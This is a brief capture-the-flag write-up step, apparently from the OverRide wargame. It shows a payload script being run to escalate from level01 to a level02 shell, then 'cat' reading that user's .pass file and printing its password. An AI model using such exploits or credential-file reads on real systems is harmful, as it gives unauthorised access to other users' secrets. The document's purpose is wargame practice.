Execute Resources/payload.sh on the machine placing it in /tmp folder (or any other folder you can write in) to get a shell as level02:

```sh
level01@OverRide:~$ /tmp/payload.sh 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
